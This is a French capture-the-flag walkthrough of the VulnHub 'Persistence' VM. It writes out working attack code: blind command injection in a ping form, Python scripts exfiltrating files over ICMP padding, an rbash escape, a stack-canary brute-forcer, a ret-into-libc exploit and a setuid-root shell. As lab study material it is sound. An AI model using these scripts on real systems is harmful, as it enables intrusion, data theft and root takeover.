# Solution du CTF Persistence

Nitro
-----

Le [CTF Persistence](http://vulnhub.com/entry/persistence-1,103/) est le dernier en date organisé par *VulnHub* et largement teasé sur *Twitter*.  

Il est l'objet de cadox à gagner donc c'est une bonne raison pour s'y mettre.  

J'ai profité d'un peu de temps libre pour m'y mettre et mis de côté le [CTF OwlNest](http://vulnhub.com/entry/owlnest-102,102/) qui résiste pour le moment à mes attaques malgré quelques bonnes idées trouvées :(  

Notez que j'ai rencontré des difficultés à mettre en place la VM de *Persistence* avec *VirtualBox 4.2.18* ou *VMWare* sous Linux... J'ai finalement fait tourner cette image virtuelle sous un *VirtualBox* depuis *Windows*.  

Captain Obvious
---------------

Un seul port se révèle être ouvert : le 80.  

L'index du site web contient seulement une image (*The Persistence of Memory* de *Dali*) ce qui m'amène à utiliser [dirb](http://dirb.sourceforge.net/) (l'outil devenu indispensable pour les CTFs) pour trouver d'autres scripts.  

Effectivement après avoir testé plusieurs dictionnaires il trouve un script *debug.php* à la racine.  

Ce script demande la saisie d'une adresse IP à pinger. Aucun output n'est retourné.  

En revanche si on utilise un sniffeur de paquets on remarque bien les requêtes ICMP.  

Ping-pong en aveugle
--------------------

Comment savoir si il est possible d'injecter des commandes quand on ne dispose pas de retour dans la page web ?  

Si on entre une adresse IP suivie d'un point virgule puis d'une commande ping avec une autre adresse IP on voit alors une requête ARP pour la seconde adresse IP. Il est donc possible d'injecter des commandes.  

Seulement en jouant avec ce script on remarque assez rapidement plusieurs choses :  

* beaucoup de commandes n'aboutissent pas
* les connexions sortantes semblent filtrées (tout comme les entrantes mis à part pour le port 80, ce que *Nmap* nous indiquait).

Il y a fort à parier qu'il y ait soit un filtre assez complexe sur le champ de saisie soit on est dans un environnement restreint.  

Mon adresse IP étant 192.168.1.3 (celle de la VM 192.168.1.21) j'ai utilisé des backticks avec un test conditionnel pour tester la présence de fichiers sur le système. Ainsi si je rentre le texte suivi dans le champ du formulaire :  

```plain
-c 1 `[ -f /etc/passwd ] && echo 192.168.1.3`
```

j'obtiens bien un ICMP echo reply en retour.  

En revanche avec  

```plain
-c 1 `[ -f /usr/bin/cat ] && echo 192.168.1.3`
```

nada ! Alors qu'avec  

```plain
-c 1 `[ -f /bin/bash ] && echo 192.168.1.3`
```

J'ai à nouveau un paquet ICMP. J'ai choisi de passer un moment à écrire un script me permettant d'énumérer les fichiers présents sur le système.  

Une première partie émet simplement les requêtes HTTP à destination de *debug.php* et injecte la commande ping :  

```python
import requests
import fcntl
import time

hdrs = {"Content-Type": "application/x-www-form-urlencoded"}
data = {'addr': 'command'}

with open("/tmp/files.txt") as fd:
    while True:
        word = fd.readline()
        if not word:
            break
        word = word.strip()
        if not word:
            continue

        cmd = "-c 1 `[ -f {0} ] && echo 192.168.1.3`".format(word)
        data['addr'] = cmd

        fdout = open("/tmp/current_path", "w")
        fcntl.flock(fdout.fileno(), fcntl.LOCK_EX)
        fdout.write(word)
        fcntl.flock(fdout.fileno(), fcntl.LOCK_UN)
        fdout.close()

        requests.post("http://192.168.1.21/debug.php", data=data, headers=hdrs)
        time.sleep(0.1)
```

Le path du fichier en cours de vérification est placé dans le fichier local */tmp/current\_path*. Un système de lock empèche le second script de se prendre les pieds avec celui-ci.  

Le second script est un sniffer en Python qui utilise la librairie *Pcapy* pour sniffer et *Impacket* pour décoder les trames réseau :  

```python
import pcapy
from impacket import ImpactDecoder, ImpactPacket
import fcntl

sniff = pcapy.open_live("eth0", 65536, 1, 0)
decoder = ImpactDecoder.EthDecoder()

while True:
    (header, packet) = sniff.next()
    ethernet = decoder.decode(packet)

    if ethernet.get_ether_type() == ImpactPacket.ARP.ethertype: # ARP
        continue
    elif ethernet.get_ether_type() == ImpactPacket.IP.ethertype: # ARP
        ip = ethernet.child()
        if ip.get_ip_p() == ImpactPacket.UDP.protocol:
            continue
        if ip.get_ip_p() == ImpactPacket.TCP.protocol:
            continue
        if ip.get_ip_p() == ImpactPacket.ICMP.protocol:
            icmp = ip.child()
            if icmp.get_icmp_type() == ImpactPacket.ICMP.ICMP_ECHO:
                if ip.get_ip_src() == "192.168.1.21" and ip.get_ip_dst() == "192.168.1.3":
                    fd = open("/tmp/current_path", "r")
                    fcntl.flock(fd.fileno(), fcntl.LOCK_EX)
                    buff = fd.read(1024)
                    fcntl.flock(fd.fileno(), fcntl.LOCK_UN)
                    fd.close()
                    print buff
```

J'ai ainsi récupérer la liste de fichiers suivants pour /etc :  

```plain
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/nginx/nginx.conf
/etc/php.ini
```

Pour /bin :  

```plain
/bin/ls
/bin/touch
/bin/uname
/bin/ping
/bin/bash
/bin/mkdir
/bin/su
/bin/echo
/bin/sh
```

ce qui est plutôt limité... et pour /usr/bin  

```plain
/usr/bin/tr
/usr/bin/id
/usr/bin/xxd
/usr/bin/base64
/usr/bin/python
```

On est donc visiblement dans un *chroot*. Notez qu'il serait aussi possible de tester la présence de répertoires avec *-d* en bash.  

Si on tente d'établir une connexion sortante via *Python* en injectant :  

```plain
-c 1 `python -c 'import socket;socket.socket().connect(("192.168.1.3",21))';echo 192.168.1.3`
```

alors aucune connexion n'est établie, en revanche le script PHP prend un certain temps à répondre preuve que le firewall doit jeter la connexion au lieu de forcer sa fermeture.  

A tout hasard j'ai essayé via *Python* de scanner les ports de la machine hôte depuis la VM en TCP et UDP : vraiment rien ne sort.  

Le serveur web étant un *nginx* on trouve facilement via une recherche *duckduckgo* quel est le path par défaut. On peut confirmer le chemin du script *debug.php* avec cette commande :  

```plain
-c 1 `[ -f /usr/share/nginx/html/debug.php ] && echo 192.168.1.3`
```

Malheureusement l'utilisateur *nginx* avec lequel s'effectue les commandes ne dispose d'aucun droit en lecture dans la racine web.  

Tout n'est pas perdu : on peut exécuter des commandes, il ne nous manque seulement un moyen d'exfiltrer l'output via les paquets ICMP.  

Injecter un payload dans la balle
---------------------------------

Un petit tour dans la manpage de ping et on trouve finalement notre bonheur :  

> -p pattern  
> 
>    You may specify up to 16 ``pad'' bytes to fill out the packet you send. This is useful for diagnosing data-dependent problems in a network.  
> 
>    For example, -p ff will cause the sent packet to be filled with all ones.

Après quelques tests avec un *Wireshark* en parallèle on remarque qu'il faut aussi utiliser l'option *-s* qui permet de forcer la taille des données et ainsi avoir un décalage constant pour retrouver les données.  

On utilisera ainsi *ping* de cette façon :  

```bash
ping -p 4142434445464748495051525354555657 -s 32 192.168.1.3
```

Mais à la place des caractères hexa de *ABCD*... il faut inclure l'output de commandes ou bien la représentation hexadécimale d'un fichier. C'est là que *xxd* intervient. *xxd* est un visualiseur hexadécimal qui par défaut affiche les offsets, sépare les codes hexa en colonnes et affiche aussi la représentation textuelle.  

Seulement avec l'option *-p* on peut obtenir un output plus brut. L'option *-l* permet quand à elle de spécifier la taille de données à afficher et enfin l'option *-s* permet de dire à quelle position du fichier on commence. Par exemple  

```bash
xxd -p -l 16 -s 16 fichier
```

retourne les codes hexa des octets 16 à 32 de fichier.  

On reprend notre script d'écoute précédent et on le rectifie pour qu'il puisse afficher directement les 16 derniers octets des paquets ICMP reçus :  

```python
import pcapy
from impacket import ImpactDecoder, ImpactPacket
import fcntl
import sys

sniff = pcapy.open_live("eth0", 65536, 1, 0)
decoder = ImpactDecoder.EthDecoder()

while True:
    (header, packet) = sniff.next()
    ethernet = decoder.decode(packet)

    if ethernet.get_ether_type() == ImpactPacket.ARP.ethertype: # ARP
        continue
    elif ethernet.get_ether_type() == ImpactPacket.IP.ethertype: # ARP
        ip = ethernet.child()
        if ip.get_ip_p() == ImpactPacket.UDP.protocol:
            continue
        if ip.get_ip_p() == ImpactPacket.TCP.protocol:
            continue
        if ip.get_ip_p() == ImpactPacket.ICMP.protocol:
            icmp = ip.child()
            if icmp.get_icmp_type() == ImpactPacket.ICMP.ICMP_ECHO:
                if ip.get_ip_src() == "192.168.1.21" and ip.get_ip_dst() == "192.168.1.3":
                    data = icmp.child().get_buffer_as_string()
                    l = len(data)
                    payload = data[l-16:]
                    sys.stdout.write(payload)
                    sys.stdout.flush()
```

et côté web :  

```python
import sys
import requests

fname = sys.argv[1]
hdrs = {"Content-Type": "application/x-www-form-urlencoded"}
data = {'addr': 'command'}

for i in range(0, 20000):
    ping_args = "-c 1 -s 32 -p `xxd -p -l 16 -s {0} {1}` 192.168.1.3".format(i*16, fname)
    data['addr'] = ping_args
    requests.post("http://192.168.1.21/debug.php", data=data, headers=hdrs)
```

La boucle permet d'itérer jusqu'à 20000 blocks de 16 octets. Normalement c'est inutile d'aller aussi loin mais ça m'a servi pour le *php.ini* qui était super long.  

Parmi mes trophés on trouve le */etc/passwd* :  

```plain
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
saslauth:x:499:76:"Saslauthd user":/var/empty/saslauth:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
nginx:x:498:498:Nginx web server:/var/lib/nginx:/bin/bash
apache:x:48:48:Apache:/var/www/sbin/nologin
```

Le fichier de configuration principal de *nginx* :  

```plain
user  nginx;
worker_processes  1;

error_log  /var/log/nginx/error.log warn;
pid        /var/run/nginx.pid;

events {
    worker_connections  1024;
}

http {
    include       /etc/nginx/mime.types;
    default_type  application/octet-stream;

    log_format  main  '$remote_addr - $remote_user [$time_local] "$request" '
                      '$status $body_bytes_sent "$http_referer" '
                      '"$http_user_agent" "$http_x_forwarded_for"';

    access_log  /var/log/nginx/access.log  main;

    sendfile        on;
    #tcp_nopush     on;

    keepalive_timeout  65;

    #gzip  on;

    include /etc/nginx/conf.d/*.conf;}

}
```

et le fichier */etc/nginx/conf.d/default.conf*  

```plain
# The default server
#
server {
    listen       80 default_server;
    server_name  _;

    #charset koi8-r;

    #access_log  logs/host.access.log  main;

    location / {
        root   /usr/share/nginx/html;
        index  index.php index.html index.htm;
    }

    error_page  404              /404.html;
    location = /404.html {
        root   /usr/share/nginx/html;
    }

    # redirect server error pages to the static page /50x.html
    #
    error_page   500 502 503 504  /50x.html;
    location = /50x.html {
        root   /usr/share/nginx/html;
    }

    # proxy the PHP scripts to Apache listening on 127.0.0.1:80
    #
    #location ~ \.php$ {
    #    proxy_pass   http://127.0.0.1;
    #}

    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000
    #
    location ~ \.php$ {
        root           /usr/share/nginx/html;
        fastcgi_pass   127.0.0.1:9000;
        fastcgi_index  index.php;
        fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
        include        fastcgi_params;
    }

    # deny access to .htaccess files, if Apache's document root
    # concurs with nginx's one
    #
    #location ~ /\.ht {
    #    deny  all   #}
}
```

Le *php.ini* ne nous est finalement d'aucune utilité et les fichiers récupérés ne sont malheureusement pas très utiles non plus.  

Ça devient plus intéressant si on injecte un *ls -alR* d'un dossier de notre choix, que l'on redirige l'output vers un fichier dans */tmp* et que l'on rapatrie cet output via notre script.  

Je ne vous donne pas toutes les lignes que j'ai pu récupérer mais on découvre que dans */dev* il n'y a que *null*, *random* et *urandom*, que dans */etc* il n'y a que le script nécessaire mais il n'y a pas de *rc.d* ni de *init.d* et enfin qu'il n'y a pas de */root* (ce qui confirme encore plus l'utilisation d'un *chroot*).  

Par contre ce qui est intéressant c'est ceci :  

```plain
/usr/share/nginx/html:
total 168
drwxr-xr-x. 2 root root   4096 Aug 16 04:02 .
drwxr-xr-x. 3 root root   4096 Mar 12 06:06 ..
-rwxr-xr-x. 1 root root    439 Mar 17 17:34 debug.php
-rw-r--r--. 1 root root    391 Mar 12 00:48 index.html
-rw-r--r--. 1 root root 146545 Mar 12 00:10 persistence_of_memory_by_tesparg-d4qo048.jpg
-rwsr-xr-x. 1 root root   5757 Mar 17 11:53 sysadmin-tool
```

D'abord par curiosité voici le contenu de *debug.php* :  

```php
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
        <head>
                <title>Debug Page</title>
        </head>
        <body>
                <form action="debug.php" method="post">
                Ping address: <input type="text" name="addr">
                <input type="submit">
                </form>
        </body>
</html>
<?php 
if (isset($_POST["addr"]))
{
        exec("/bin/ping -c 4 ".$_POST["addr"])}
?>
```

Ensuite le binaire setuid root *sysadmin-tool* est accessible via le navigateur (yes !).  

Un strings permet d'obtenir une idée de ce qu'il fait  

```plain
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
_IO_stdin_used
chroot
strncmp
puts
setreuid
mkdir
rmdir
chdir
system
__libc_start_main
GLIBC_2.0
PTRh 
[^_]
Usage: sysadmin-tool --activate-service
--activate-service
breakout
/bin/sed -i 's/^#//' /etc/sysconfig/iptables
/sbin/iptables-restore < /etc/sysconfig/iptables
Service started...
Use avida:dollars to access.
/nginx/usr/share/nginx/html/breakout
```

On injecte une commande pour appeler *sysadmin-tool --activate-service* et bing ! Un port 22 (SSH) est ouvert sur lequel on peut se connecter avec le login *avida* et le mot de passe *dollars*.  

Prison break
------------

Une fois connecté on a la joie (ou pas) de se retrouver dans un bash restreint (*rbash*) :  

```plain
$ ssh avida@192.168.1.21
avida@192.168.1.21's password: 
Last login: Mon Mar 17 17:13:40 2014 from 10.0.0.210
-rbash-4.1$ ls -al
total 36
drwxr-x---. 3 root avida 4096 17 mars  12:40 .
drwxr-xr-x. 3 root root  4096 30 mai   19:04 ..
-rw-r-----. 1 root avida  100 17 mars  11:57 .bash_history
-rw-r-----. 1 root avida   10 17 mars  12:37 .bash_login
-rw-r-----. 1 root avida   10 17 mars  12:37 .bash_logout
-rw-r-----. 1 root avida   10 17 mars  12:37 .bash_profile
-rw-r-----. 1 root avida   32 17 mars  12:39 .bashrc
-rw-r-----. 1 root avida   10 17 mars  12:37 .profile
drwxr-xr-x. 3 root avida 4096 17 mars  12:40 usr
-rbash-4.1$ pwd
/home/avida
-rbash-4.1$ env
-rbash: env : commande introuvable
-rbash-4.1$ which vi vim python
-rbash: /usr/bin/which : restriction : « / » ne peut pas être spécifié dans un nom de commande
-rbash-4.1$ ls /
bin  boot  dev  etc  home  lib  lost+found  media  mnt  nginx  opt  proc  root  sbin  selinux  srv  sys  tmp  usr  var
-rbash-4.1$ cat .bash_history
ls -al
sudo
sudo -l
clear
exit
ls -al
cd /nginx/
ls -al
cd /nginx/usr/share/nginx/html/
ls -al
exit
-rbash-4.1$ sudo -l
-rbash: sudo : commande introuvable
-rbash-4.1$ python
-rbash: python : commande introuvable
-rbash-4.1$ find / -type f -name python 2> /dev/null
-rbash: /dev/null : restreint : impossible de rediriger la sortie
-rbash-4.1$ echo $PATH
/home/avida/usr/bin
-rbash-4.1$ export -p
--- snip ---
declare -x HOME="/home/avida"
declare -x HOSTNAME="persistence"
declare -x LOGNAME="avida"
declare -x MAIL="/var/spool/mail/avida"
declare -x OLDPWD
declare -rx PATH="/home/avida/usr/bin"
declare -x PWD="/home/avida"
declare -rx SHELL="/bin/rbash"
declare -x USER="avida"
```

Les variables d'environnement *SHELL* et *PATH* sont un lecture seule... Ce serait trop simple. Idem pas d'accès sur le système de fichiers.  

Dans le seul path qui nous est laissé (*/home/avida/usr/bin*) on trouve la commande *nice* qui permet de passer des commandes et ainsi de s'échapper du *rbash* :  

```plain
-rbash-4.1$ nice /usr/bin/sudo -l
[sudo] password for avida: 
Sorry, user avida may not run sudo on persistence.
```

Pour obtenir un shell on utilisera *nice /bin/bash*. Il faut ensuite corriger le *PATH* et la variable *SHELL* pour ne pas être embêté.  

Shall we play a game ?
----------------------

Avec notre nouveau shell on remarque dans les processus un programme *wopr* lancé par root :  

```plain
root      1020  0.0  0.0   2004   412 ?        S    Sep08   0:00 /usr/local/bin/wopr
```

Ce programme n'est pas setuid mais qu'importe si on peut l'exploiter :  

```plain
bash-4.1$ strings /usr/local/bin/wopr
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
_IO_stdin_used
socket
exit
htons
perror
puts
fork
__stack_chk_fail
listen
memset
__errno_location
bind
read
memcpy
setsockopt
waitpid
close
accept
__libc_start_main
setenv
write
GLIBC_2.4
GLIBC_2.0
PTRhP
[^_]
[+] yeah, I don't think so
socket
setsockopt
bind
[+] bind complete
listen
/tmp/log
TMPLOG
[+] waiting for connections
[+] logging queries to $TMPLOG
accept
[+] got a connection
[+] hello, my name is sploitable
[+] would you like to play a game?
[+] bye!
```

Un *nm* sur le binaire retourne la liste des fonctions importées et montre la présence d'une méthode interne baptisée *get\_reply*.  

Le binaire utitise les fonctions memcpy, read et setenv ainsi que les fonctions classiques de sockets.  

Il écoute sur le port TCP 3333, affirme qu'il enregistre les requêtes dans *$TMPLOG* (défini à */tmp/log*) sauf que ce n'est pas le cas d'après le code désassemblé.  

Lors d'une connexion il *fork()*, lit les données puis les passe à *get\_reply* que voici :  

```plain
[0x080486c0]> pdf@sym.get_reply
|          ; CODE (CALL) XREF from 0x08048ad1 (fcn.080487de)
/ (fcn) sym.get_reply 106
|          0x08048774    55           push ebp
|          0x08048775    89e5         mov ebp, esp
|          0x08048777    83ec3c       sub esp, 0x3c
|          0x0804877a    8b4508       mov eax, [ebp+0x8]
|          0x0804877d    8945d8       mov [ebp-0x28], eax
|          0x08048780    8b450c       mov eax, [ebp+0xc]
|          0x08048783    8945d4       mov [ebp-0x2c], eax
|          0x08048786    8b4510       mov eax, [ebp+0x10]
|          0x08048789    8945d0       mov [ebp-0x30], eax
|          0x0804878c    65a114000000 mov eax, [gs:0x14]
|          0x08048792    8945fc       mov [ebp-0x4], eax
|          0x08048795    31c0         xor eax, eax
|          0x08048797    8b45d4       mov eax, [ebp-0x2c]
|          0x0804879a    89442408     mov [esp+0x8], eax
|          0x0804879e    8b45d8       mov eax, [ebp-0x28]
|          0x080487a1    89442404     mov [esp+0x4], eax
|          0x080487a5    8d45de       lea eax, [ebp-0x22]
|          0x080487a8    890424       mov [esp], eax
|          ; CODE (CALL) XREF from 0x08048622 (fcn.08048622)
|          ; CODE (CALL) XREF from 0x08048662 (fcn.08048662)
|          0x080487ab    e86cfeffff   call sym.imp.memcpy
|             sym.imp.memcpy(unk)
|          0x080487b0    c74424081b0. mov dword [esp+0x8], 0x1b ;  0x0000001b 
|          0x080487b8    c7442404148. mov dword [esp+0x4], str.___yeah_Idon_tthinkso ;  0x08048c14 
|          0x080487c0    8b45d0       mov eax, [ebp-0x30]
|          0x080487c3    890424       mov [esp], eax
|          0x080487c6    e8c1fdffff   call sym.imp.write
|             sym.imp.write()
|          0x080487cb    8b45fc       mov eax, [ebp-0x4]
|          0x080487ce    65330514000. xor eax, [gs:0x14]
|          0x080487d5    7405         je 0x80487dc
|          0x080487d7    e880feffff   call sym.imp.__stack_chk_fail
|             sym.imp.__stack_chk_fail()
|          0x080487dc    c9           leave
\          0x080487dd    c3           ret
```

A l'entrée de cette méthode eax et ecx pointent vers la chaine reçue et edx vaut 512 ce qui est la taille maxi utilisée par *recv*.  

Seulement cette chaîne est copiée via *memcpy* à l'adresse *ebp-0x22* soit 34 octets avant d'écraser l'ancien frame pointeur. Il y a donc un stack overflow.  

La difficulté ici réside dans la présence de *\_\_stack\_chk\_fail* qui vérifie la présence d'un stack-cookie situé en *ebp-0x4*.  

Il est défini à l'adresse *0x0804878c* (récupéré depuis *gs:0x14*), sauvé dans *ebp-0x4* puis cette valeur sauvé est comparée en *0x080487cb* avec la valeur initiale.  

Par conséquent on ne peut pas écraser l'adresse de retour sans avoir aussi écrasé le stack cookie qui quitte prématurément le programme :(  

Ainsi si on envoie 64 caractères *A* sur notre *wopr* en local :  

```plain
$ ./wopr
[+] bind complete
[+] waiting for connections
[+] logging queries to $TMPLOG
[+] got a connection
*** stack smashing detected ***: ./wopr terminated
======= Backtrace: =========
/lib/libc.so.6(+0x6dd33)[0xf763cd33]
/lib/libc.so.6(__fortify_fail+0x45)[0xf76ce925]
/lib/libc.so.6(+0xff8da)[0xf76ce8da]
./wopr[0x80487dc]
[0x41414141]
======= Memory map: ========
08048000-08049000 r-xp 00000000 08:02 543264                             /tmp/persistence/wopr
08049000-0804a000 r--p 00000000 08:02 543264                             /tmp/persistence/wopr
0804a000-0804b000 rw-p 00001000 08:02 543264                             /tmp/persistence/wopr
09dde000-09dff000 rw-p 00000000 00:00 0                                  [heap]
f75ce000-f75cf000 rw-p 00000000 00:00 0 
f75cf000-f777a000 r-xp 00000000 08:02 788334                             /lib/libc-2.18.so
f777a000-f777b000 ---p 001ab000 08:02 788334                             /lib/libc-2.18.so
f777b000-f777d000 r--p 001ab000 08:02 788334                             /lib/libc-2.18.so
f777d000-f777e000 rw-p 001ad000 08:02 788334                             /lib/libc-2.18.so
f777e000-f7781000 rw-p 00000000 00:00 0 
f7796000-f77b1000 r-xp 00000000 08:02 788012                             /lib/libgcc_s.so.1
f77b1000-f77b2000 r--p 0001a000 08:02 788012                             /lib/libgcc_s.so.1
f77b2000-f77b3000 rw-p 0001b000 08:02 788012                             /lib/libgcc_s.so.1
f77b3000-f77b4000 rw-p 00000000 00:00 0 
f77b4000-f77b6000 rw-p 00000000 00:00 0 
f77b6000-f77b7000 r-xp 00000000 00:00 0                                  [vdso]
f77b7000-f77d8000 r-xp 00000000 08:02 788829                             /lib/ld-2.18.so
f77d8000-f77d9000 r--p 00020000 08:02 788829                             /lib/ld-2.18.so
f77d9000-f77da000 rw-p 00021000 08:02 788829                             /lib/ld-2.18.so
ffb6d000-ffb8e000 rw-p 00000000 00:00 0                                  [stack]
```

Que peut-on dire d'autre ?  

```plain
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   wopr
```

La pile est malheureusement non-exécutable et l'ASLR n'est pas activé sur la VM (une bonne nouvelle).  

Le déboguage en local du programme permet de déterminer plus facilement les adresses que l'on aura à écraser.  

Pour cela il faut utiliser la commande gdb *set follow-fork-mode child* qui indique à gdb de tracer le processus fils lors d'un *fork()*.  

Si on envoie une chaîne générée via Python (*"A" \* 30 + "CCCC" + "D"\*4 + "E"\*4 + "F"\*4 + "G"\*4 + "H" \* 4*) alors :  

* esp pointe vers AAAA...
* le cookie (canary) est écrasé par CCCC
* l'adresse de retour est écrasée par EEEE

La procédure d'attaque est la suivante : on ne peut pas utiliser la stack en raison de NX et on ne peut pas non plus placer un shellcode en environnement car le programme est déjà en fonctionnement, il faut donc profiter de l'absence de l'ASLR pour faire un *ret-into-libc*.  

Via gdb on trouve l'adresse de *system* :  

```plain
(gdb) p system
$1 = {<text variable, no debug info>} 0x16c210 <system>
```

Notez que l'adresse de *system* comporte un octet nul qui est, comme expliqué sur le [CTF Xerxes2](http://devloop.users.sourceforge.net/index.php?article103/solution-du-ctf-xerxes-2), un mécanisme de protection de gcc.  

Mais comme on n'est pas en face d'un *strcpy* les octets nuls n'ont pas d'importance.  

Il nous faut aussi l'adresse d'une chaîne correspondant au path d'un fichier sur le système. Ici il y a une chaîne fixe dans le binaire : */tmp/log* qui est à *0x08048c60*.  

On sait donc ce que l'on va mettre sur la stack... Ne nous reste plus que le *canary* :(  

*memcpy* a l'avantage d'écrire strictement ce qu'on lui demande : il n'ajoute pas de zéro terminal.  

Par conséquent si on écrase le premier octet du *canary* par la valeur qui était déjà présente alors le programme fonctionnera correctement. Il retournera dans le main depuis *get\_reply* et enverra *"bye"* sur la socket.  

Si on écrase cet octet par une valeur différente alors *\_\_stack\_chk\_fail* sera appelé et *"bye"* ne sera pas envoyé.  

Il suffit donc d'essayer toutes les valeurs possibles pour ce premier octet, trouver la bonne valeur puis passer à l'octet suivant du canary et ainsi de suite.  

Comme le programme *fork()* la valeur du canary reste constante à l'exécution du programme (la mémoire du processus est recopiée par *fork()*) on peut donc bruteforcer octet par octet sans crainte.  

Le code suivant permet de retrouver le canary :  

```python
import socket
import struct
import time

canary = ""

for i in range(0, 4):
        for byte in xrange(0, 0xff):
                s = socket.socket()
                s.connect(("127.0.0.1", 3333))
                s.recv(1024)
                buff = "A" * 30
                buff += canary + chr(byte)
                s.send(buff)
                buff  = s.recv(2014) # [+] yeah, I don't think so
                buff += s.recv(1024) # [+] bye! or empty
                if "bye" in buff:
                        canary += chr(byte)
                        print "canary = " + canary.encode("hex_codec")
                        break
                s.close()
```

En local l'exécution est quasi-immédiate. Sur la VM c'est plus lent, peut être le fait de l'avoir bourriné avant :p  

On obtient ce résultat :  

```plain
canary = 77
canary = 77b7
canary = 77b717
canary = 77b717d5
```

Le canary est à lire en sens inverse, sa valeur est *0xd517b777*.  

On a maintenant toutes les informations en main.  

J'ai écrit et compilé le programme suivant qui ne demande qu'à devenir setuid root.  

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0);
  setgid(0);
  system("/bin/bash");
  return 0;
}
```

et j'ai créé le script shell */tmp/log* suivant (ne pas oublier de le rendre exécutable) :  

```bash
#!/bin/bash
chown root.root /tmp/getroot
chmod u+s /tmp/getroot
```

Voici l'exploit final :  

```python
import socket
import struct

canary = 0xd517b777

s = socket.socket()
s.connect(("127.0.0.1", 3333))
s.recv(1024)

buff  = "A" * 30
buff += struct.pack("I", canary)
buff += "Z" * 4 # saved-ebp
buff += struct.pack("I", 0x0016c210) # adresse de system
buff += "A" * 4 # garbage
buff += struct.pack("I", 0x08048c60) # adresse de /tmp/log

s.send(buff)
s.recv(2014)
s.close()
```

Une fois exécuté, le processus *wopr* exécute */tmp/log* via *system()* ce qui rend notre binaire *getroot* setuid root et nous ouvre la porte :)  

```plain
bash-4.1# cat flag.txt
              .d8888b.  .d8888b. 888
             d88P  Y88bd88P  Y88b888
             888    888888    888888
888  888  888888    888888    888888888
888  888  888888    888888    888888
888  888  888888    888888    888888
Y88b 888 d88PY88b  d88PY88b  d88PY88b.
 "Y8888888P"  "Y8888P"  "Y8888P"  "Y888

Congratulations!!! You have the flag!

We had a great time coming up with the
challenges for this boot2root, and we
hope that you enjoyed overcoming them.

Special thanks goes out to @VulnHub for
hosting Persistence for us, and to
@recrudesce for testing and providing
valuable feedback!

Until next time,
      sagi- & superkojiman
```


*Published October 06 2014 at 08:12*